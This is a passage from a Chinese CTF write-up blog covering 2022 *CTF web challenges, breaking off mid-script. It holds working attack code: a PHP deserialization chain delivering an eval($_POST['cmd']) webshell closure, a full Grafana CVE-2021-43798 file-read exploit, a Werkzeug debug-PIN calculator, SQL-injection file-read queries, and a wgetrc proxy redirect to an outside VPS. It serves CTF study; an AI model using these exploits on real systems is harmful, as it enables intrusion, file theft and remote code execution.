class="line"><span class="variable">$b</span> = <span class="number">4</span>; <span class="comment">//重点就是$b要在最后赋值为恶意的数据</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;second&quot;</span> . <span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">输出：</span><br><span class="line">***<span class="number">2</span></span><br><span class="line">first33</span><br><span class="line">second4</span><br></pre></td></tr></table></figure><p>既然可以绕过，payload就可以构造出来了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">User</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">instance</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_password</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;instance = <span class="keyword">new</span> <span class="title class_">Faker\Generator</span>(<span class="variable language_">$this</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_password = [<span class="string">&quot;_username&quot;</span>=&gt;<span class="string">&quot;phpinfo&quot;</span>];</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;s:8:\&quot;password\&quot;&quot;</span>,<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;s%3A14%3A%22%00User%00password%22&quot;</span>),<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">User</span>())));</span><br><span class="line">    <span class="comment">//echo base64_encode(serialize(new User()));</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Generator</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">formatters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters = &amp;<span class="variable">$obj</span>-&gt;password;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的执行顺序是：先Faker下的<code>__construct</code>然后才是User下的<code>__construct</code>就满足了我上面说的绕过条件 : )，这里有几个注意点，第一点：为什么官方wp进行了<code>str_replace</code>替换，官方的解释是<code>原来类的password属性是private的，而因为要构造引用，需要在类外访问，于是我改成了public，但是在最后还是需要修改成对应的private。</code> 但是其实这里直接使用public也是可以的，因为在<code>PHP7.1以上版本对属性类型不敏感</code> ，同时我自己测试也是可以的，这算是对官方wp的补充了。第二点：为什么传入phpinfo，是因为这里<code>__get</code> 的参数不可控，只能使用无参的函数进行验证。（这里其实也为后面rce做了铺垫）</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">b</span>();</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>());</span><br><span class="line"><span class="meta">?&gt;</span> <span class="comment">//这里是可以直接执行phpinfo()的</span></span><br></pre></td></tr></table></figure><p>第三点：为什么数组的键是<code>__username</code>，我在这里绕了好久直到看到下面的，好吧我是fw。<img src="/img/image-20220924143636-0teuz36.png" alt="image.png"></p><h3 id="反序列化匿名函数造成任意代码执行："><a href="#反序列化匿名函数造成任意代码执行：" class="headerlink" title="反序列化匿名函数造成任意代码执行："></a>反序列化匿名函数造成任意代码执行：</h3><p>这里只能控制传入的函数显然是不能拿到flag，主要是由于参数不可控，那这里就想到了闭包函数不是也可以吗，同时结合composer.json里面的<code>opis/closure</code> ，这不是刚好可以<code>反序列化闭包函数rce</code>嘛</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">User</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">instance</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span>;  <span class="comment">//题目php版本是8.0.6，php7.1以上对属性类型不敏感</span></span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_password</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;instance = <span class="keyword">new</span> <span class="title class_">Faker\Generator</span>(<span class="variable language_">$this</span>);</span><br><span class="line">            <span class="comment">//$this-&gt;_password = [&quot;_username&quot;=&gt;&quot;phpinfo&quot;];</span></span><br><span class="line">            <span class="variable">$func</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">            &#125;;    <span class="comment">//可写马，测试用的phpinfo;</span></span><br><span class="line">            <span class="keyword">require</span> <span class="string">&#x27;closure/autoload.php&#x27;</span>;</span><br><span class="line">            <span class="comment">//require(&#x27;vendor/autoload.php&#x27;); 这里二者区别主要就是编译的目录不同</span></span><br><span class="line">            <span class="variable">$b</span>=\Opis\<span class="built_in">Closure</span>\<span class="title function_ invoke__">serialize</span>(<span class="variable">$func</span>);</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            <span class="variable">$c</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_password = [<span class="string">&quot;_username&quot;</span>=&gt;<span class="variable">$c</span>];</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// echo serialize(new User()).&quot;\n&quot;;</span></span><br><span class="line">    <span class="comment">// echo str_replace(&quot;s:8:\&quot;password\&quot;&quot;,urldecode(&quot;s%3A14%3A%22%00User%00password%22&quot;),serialize(new User())).&quot;\n&quot;;</span></span><br><span class="line">    <span class="comment">//echo base64_encode(str_replace(&quot;s:8:\&quot;password\&quot;&quot;,urldecode(&quot;s%3A14%3A%22%00User%00password%22&quot;),serialize(new User())));</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">User</span>()));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Generator</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">formatters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters = &amp;<span class="variable">$obj</span>-&gt;password;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/image-20220924144605-ob4kxdr.png" alt="image.png"></p><p><img src="/img/image-20220924144534-hp5j5o1.png" alt="image.png"></p><p>写在最后：好久没碰web导致有好多小知识点很模糊，这次复现也是学到了很多，师傅们发现文章有问题的可以私聊俺的扣扣，欢迎交流&#x3D;。&#x3D;</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 2022 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022_star_ctf复现</title>
      <link href="/post/0.html"/>
      <url>/post/0.html</url>
      
        <content type="html"><![CDATA[<h1 id="star-ctf"><a href="#star-ctf" class="headerlink" title="star ctf"></a>star ctf</h1><h1 id="oh-my-grafana"><a href="#oh-my-grafana" class="headerlink" title="oh-my-grafana"></a>oh-my-grafana</h1><h4 id="链接"><a href="#链接" class="headerlink" title="链接"></a><a href="http://blog.seals6.top/index.php/archives/18/">链接</a></h4><h4 id="一键化工具"><a href="#一键化工具" class="headerlink" title="一键化工具"></a><a href="https://github.com/A-D-Team/grafanaExp">一键化工具</a></h4><p>进入题目，查看grafana的版本，上网进行查找发现<code>CVE-2021-43798 Grafana 任意文件读取漏洞</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#插件列表</span></span><br><span class="line">alertmanager</span><br><span class="line">grafana</span><br><span class="line">loki</span><br><span class="line">postgres</span><br><span class="line">grafana-azure-monitor-datasource</span><br><span class="line"><span class="keyword">mixed</span></span><br><span class="line">prometheus</span><br><span class="line">cloudwatch</span><br><span class="line">graphite</span><br><span class="line">mssql</span><br><span class="line">tempo</span><br><span class="line">dashboard</span><br><span class="line">influxdb</span><br><span class="line">mysql</span><br><span class="line">testdata</span><br><span class="line">elasticsearch</span><br><span class="line">jaeger</span><br><span class="line">opentsdb</span><br><span class="line">zipkin</span><br><span class="line">alertGroups</span><br><span class="line">bargauge</span><br><span class="line">debug</span><br><span class="line">graph</span><br><span class="line">live</span><br><span class="line">piechart</span><br><span class="line">status-history</span><br><span class="line">timeseries</span><br><span class="line">alertlist</span><br><span class="line">candlestick</span><br><span class="line">gauge</span><br><span class="line">heatmap</span><br><span class="line">logs</span><br><span class="line">pluginlist</span><br><span class="line">table</span><br><span class="line">welcome</span><br><span class="line">annolist</span><br><span class="line">canvas</span><br><span class="line">geomap</span><br><span class="line">histogram</span><br><span class="line">news</span><br><span class="line">stat</span><br><span class="line">table-old</span><br><span class="line">xychart</span><br><span class="line">barchart</span><br><span class="line">dashlist</span><br><span class="line">gettingstarted</span><br><span class="line">icon</span><br><span class="line">nodeGraph</span><br><span class="line">state-timeline</span><br><span class="line">text</span><br></pre></td></tr></table></figure><p>现成的POC</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: Grafana 8.3.0 - Directory Traversal and Arbitrary File Read</span></span><br><span class="line"><span class="comment"># Date: 08/12/2021</span></span><br><span class="line"><span class="comment"># Exploit Author: s1gh</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://grafana.com/</span></span><br><span class="line"><span class="comment"># Vulnerability Details: https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p</span></span><br><span class="line"><span class="comment"># Version: V8.0.0-beta1 through V8.3.0</span></span><br><span class="line"><span class="comment"># Description: Grafana versions 8.0.0-beta1 through 8.3.0 is vulnerable to directory traversal, allowing access to local files.</span></span><br><span class="line"><span class="comment"># CVE: CVE-2021-43798</span></span><br><span class="line"><span class="comment"># Tested on: Debian 10</span></span><br><span class="line"><span class="comment"># References: https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p47p</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"></span><br><span class="line">plugin_list = [</span><br><span class="line">    <span class="string">&quot;alertlist&quot;</span>,</span><br><span class="line">    <span class="string">&quot;annolist&quot;</span>,</span><br><span class="line">    <span class="string">&quot;barchart&quot;</span>,</span><br><span class="line">    <span class="string">&quot;bargauge&quot;</span>,</span><br><span class="line">    <span class="string">&quot;candlestick&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cloudwatch&quot;</span>,</span><br><span class="line">    <span class="string">&quot;dashlist&quot;</span>,</span><br><span class="line">    <span class="string">&quot;elasticsearch&quot;</span>,</span><br><span class="line">    <span class="string">&quot;gauge&quot;</span>,</span><br><span class="line">    <span class="string">&quot;geomap&quot;</span>,</span><br><span class="line">    <span class="string">&quot;gettingstarted&quot;</span>,</span><br><span class="line">    <span class="string">&quot;grafana-azure-monitor-datasource&quot;</span>,</span><br><span class="line">    <span class="string">&quot;graph&quot;</span>,</span><br><span class="line">    <span class="string">&quot;heatmap&quot;</span>,</span><br><span class="line">    <span class="string">&quot;histogram&quot;</span>,</span><br><span class="line">    <span class="string">&quot;influxdb&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jaeger&quot;</span>,</span><br><span class="line">    <span class="string">&quot;logs&quot;</span>,</span><br><span class="line">    <span class="string">&quot;loki&quot;</span>,</span><br><span class="line">    <span class="string">&quot;mssql&quot;</span>,</span><br><span class="line">    <span class="string">&quot;mysql&quot;</span>,</span><br><span class="line">    <span class="string">&quot;news&quot;</span>,</span><br><span class="line">    <span class="string">&quot;nodeGraph&quot;</span>,</span><br><span class="line">    <span class="string">&quot;opentsdb&quot;</span>,</span><br><span class="line">    <span class="string">&quot;piechart&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pluginlist&quot;</span>,</span><br><span class="line">    <span class="string">&quot;postgres&quot;</span>,</span><br><span class="line">    <span class="string">&quot;prometheus&quot;</span>,</span><br><span class="line">    <span class="string">&quot;stackdriver&quot;</span>,</span><br><span class="line">    <span class="string">&quot;stat&quot;</span>,</span><br><span class="line">    <span class="string">&quot;state-timeline&quot;</span>,</span><br><span class="line">    <span class="string">&quot;status-histor&quot;</span>,</span><br><span class="line">    <span class="string">&quot;table&quot;</span>,</span><br><span class="line">    <span class="string">&quot;table-old&quot;</span>,</span><br><span class="line">    <span class="string">&quot;tempo&quot;</span>,</span><br><span class="line">    <span class="string">&quot;testdata&quot;</span>,</span><br><span class="line">    <span class="string">&quot;text&quot;</span>,</span><br><span class="line">    <span class="string">&quot;timeseries&quot;</span>,</span><br><span class="line">    <span class="string">&quot;welcome&quot;</span>,</span><br><span class="line">    <span class="string">&quot;zipkin&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">args</span>):</span><br><span class="line">    s = requests.Session()</span><br><span class="line">    headers = &#123; <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.&#x27;</span> &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        file_to_read = <span class="built_in">input</span>(<span class="string">&#x27;Read file &gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url = args.host + <span class="string">&#x27;/public/plugins/&#x27;</span> + choice(plugin_list) + <span class="string">&#x27;/../../../../../../../../../../../../..&#x27;</span> + file_to_read</span><br><span class="line">            req = requests.Request(method=<span class="string">&#x27;GET&#x27;</span>, url=url, headers=headers)</span><br><span class="line">            prep = req.prepare()</span><br><span class="line">            prep.url = url</span><br><span class="line">            r = s.send(prep, verify=<span class="literal">False</span>, timeout=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Plugin file not found&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[-] File not found\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">                    <span class="built_in">print</span>(r.text)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;[-] Something went wrong.&#x27;</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ConnectTimeout:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[-] Request timed out. Please check your host settings.\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;Grafana V8.0.0-beta1 - 8.3.0 - Directory Traversal and Arbitrary File Read&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-H&#x27;</span>,dest=<span class="string">&#x27;host&#x27;</span>,required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&quot;Target host&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        exploit(args)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line">          </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>拿到&#x2F;etc&#x2F;grafana&#x2F;grafana.ini下的信息之后，登录后台，远程加载mysql，获得flag</p><h1 id="oh-my-notepro"><a href="#oh-my-notepro" class="headerlink" title="oh-my-notepro"></a>oh-my-notepro</h1><p>考点：</p><p>sql注入的文件读取操作</p><p>python3.8  flask的pin码利用</p><p>wp:</p><p>存在sql注入，官方wp说这里存在提示，堆叠注入，然后根据报错盲猜这个题目需要算pin码</p><p>那就直接读文件，这里可以使用联合注入，那就查看一些配置信息</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">select @@<span class="keyword">global</span>.secure_file_priv;</span><br><span class="line"><span class="comment">#/var/lib/mysql-files/ 存在限制</span></span><br><span class="line">select @@<span class="keyword">global</span>.local_infile;</span><br><span class="line"><span class="comment"># 1 可以利用load data local infile; 写数据到新建表里面</span></span><br></pre></td></tr></table></figure><h4 id="共需要六个要素"><a href="#共需要六个要素" class="headerlink" title="共需要六个要素"></a>共需要六个要素</h4><ul><li><p><strong>username 代码中(或者终端下)通过getpass.getuser()获取，文件中(命令执行)通过读取&#x2F;etc&#x2F;passwd来猜测</strong></p></li><li><p><strong>modname 代码中也可以通过getattr(mod,”</strong><strong><strong>file</strong></strong><strong>“,None)读取  默认值为flask.app</strong></p></li><li><p><strong>appname 默认值为Flask</strong></p></li><li><p><strong>moddir 代码中通过getattr(app,”</strong><strong><strong>file</strong></strong><strong>“,None)，实际上可以通过报错得到</strong></p></li><li><p><strong>uuidnode 代码中可以通过uuid.getnode()读取，文件中通过读取&#x2F;sysclass&#x2F;net&#x2F;eth0&#x2F;address得到16进制结果，转为10进制参与计算</strong></p></li><li><p><strong>machine_id代码中通过合并3个文件的指定值确定，文件中获取</strong></p><ol><li><strong>&#x2F;ect&#x2F;machine-id</strong></li><li><strong>&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id</strong></li><li><strong>proc&#x2F;self&#x2F;cgroup  (docker环境下一般只读后两个文件，必要时候读三个文件)</strong></li></ol></li></ul><p>这道题目使用的是“&#x2F;ect&#x2F;machine-id + proc&#x2F;self&#x2F;cgroup” 官方给的解释是：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Werkzeug的更新给pin码的计算方式带来了变化,新版本是从/etc/machine-<span class="built_in">id</span>、/proc/sys/kernel/random/boot_id中读到一个值后立即<span class="keyword">break</span>，然后和/proc/self/cgroup中的<span class="built_in">id</span>值拼接，使用拼接的值来计算pin码</span><br><span class="line"><span class="comment">#简单来说就是从/etc/machine-id、/proc/sys/kernel/random/boot_id中随机读一个然后和/proc/self/cgroup 组合</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">username, eth0, machine_id, cgroup</span>):</span><br><span class="line">    probably_public_bits = [</span><br><span class="line">    username,<span class="comment"># username ok</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>, <span class="comment"># ok</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span> <span class="comment">#ok,</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span> <span class="comment"># ok</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">    private_bits = [</span><br><span class="line">        eth0,<span class="comment"># /sys/class/net/eth0/address</span></span><br><span class="line">        machine_id + cgroup</span><br><span class="line">        <span class="comment"># &#x27;7cb84391-1303-4564-8eff-ef7571804198327e92627edf30f63fde916e3c3017aea76eeb876265a726270a575d391eeb4a&#x27;# machine-id</span></span><br><span class="line">        <span class="comment"># /etc/machine-id + /proc/self/cgroup</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    h = hashlib.sha1()</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">            bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        h.update(bit)</span><br><span class="line">    h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">    num = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">        num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">    rv =<span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">                rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line">    <span class="built_in">print</span>(rv)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solve(<span class="string">&#x27;ctf&#x27;</span>, <span class="string">&#x27;2485377957891&#x27;</span>, <span class="string">&#x27;1cc402dd0e11d5ae18db04a6de87223d&#x27;</span>, <span class="string">&#x27;60e5fcb0d2096a11bb18121875744005aa677b8a9af551fbb5aea438ede44809&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="oh-my-lotto"><a href="#oh-my-lotto" class="headerlink" title="oh-my-lotto"></a>oh-my-lotto</h1><p><a href="https://www.gnu.org/software/wget/manual/html_node/Wgetrc-Commands.html">Wgetrc Commands</a>  通过在线查看linux命令的文档 <a href="https://command-not-found.com/wget">链接</a></p><p><a href="http://www.scratchbox.org/documentation/general/tutorials/glibcenv.html">Environment Variables Understood by Glibc Toolchains</a>  Linux环境变量文档</p><h4 id="非预期一：-利用wgetrc的http-proxy代理到自己的vps上，然后下载一个一模一样的forecast-txt即可"><a href="#非预期一：-利用wgetrc的http-proxy代理到自己的vps上，然后下载一个一模一样的forecast-txt即可" class="headerlink" title="非预期一： 利用wgetrc的http_proxy代理到自己的vps上，然后下载一个一模一样的forecast.txt即可"></a>非预期一： 利用wgetrc的http_proxy代理到自己的vps上，然后下载一个一模一样的<code>forecast.txt</code>即可</h4><p>wp：</p><p>forecast.txt</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http_proxy=http://<span class="number">39.106</span><span class="number">.87</span><span class="number">.143</span>:<span class="number">8888</span></span><br></pre></td></tr></table></figure><p>然后在<code>/lotto</code>页面下提交环境变量<code>wgetrc</code>和<code>forecast.txt</code>同时在自己的vps上仿照lotto的app.py，自己写一个代理</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    lotto = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">        n = <span class="built_in">str</span>(secrets.randbelow(<span class="number">40</span>))</span><br><span class="line">        lotto.append(n)</span><br><span class="line">  </span><br><span class="line">    r = <span class="string">&#x27;\n&#x27;</span>.join(lotto)</span><br><span class="line">    r = <span class="string">&#x27;http_proxy =http://39.106.87.143:8888&#x27;</span>  <span class="comment"># 这里是通过代理获得的内容，与上传的内容一样</span></span><br><span class="line">    response = make_response(r)</span><br><span class="line">    response.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;text/plain&#x27;</span></span><br><span class="line">    response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=lotto_result.txt&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure><h4 id="非预期二：首先获得一次lotto的结果，然后将这个结果作为forecast上传，利用PATH，使得wget异常（lotto没有改变），这样读取的lotto（还是原来的）就能与forecast相等，即可获得flag。"><a href="#非预期二：首先获得一次lotto的结果，然后将这个结果作为forecast上传，利用PATH，使得wget异常（lotto没有改变），这样读取的lotto（还是原来的）就能与forecast相等，即可获得flag。" class="headerlink" title="非预期二：首先获得一次lotto的结果，然后将这个结果作为forecast上传，利用PATH，使得wget异常（lotto没有改变），这样读取的lotto（还是原来的）就能与forecast相等，即可获得flag。"></a>非预期二：<strong>首先获得一次lotto的结果，然后将这个结果作为forecast上传，利用</strong><code>PATH</code>，使得wget异常（lotto没有改变），这样读取的lotto（还是原来的）就能与forecast相等，即可获得flag。</h4><p>网上借鉴师傅们的exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1:8880/&#x27;</span></span><br><span class="line"></span><br><span class="line">requests.post(url+<span class="string">&#x27;lotto&#x27;</span>,data=&#123;<span class="string">&quot;lotto_key&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;lotto_value&quot;</span>:<span class="string">&quot;2&quot;</span>&#125;)</span><br><span class="line">r = requests.get(url+<span class="string">&#x27;result&#x27;</span>).text.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>).split(<span class="string">&quot;&lt;p&gt;&quot;</span>)[-<span class="number">1</span>].split(<span class="string">&quot;&lt;/p&gt;&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;res.txt&#x27;</span>,<span class="string">&#x27;w+&#x27;</span>,newline=<span class="string">&#x27;&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.writelines(r)</span><br><span class="line"></span><br><span class="line">requests.post(url+<span class="string">&#x27;forecast&#x27;</span>,files=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;res.txt&#x27;</span>,<span 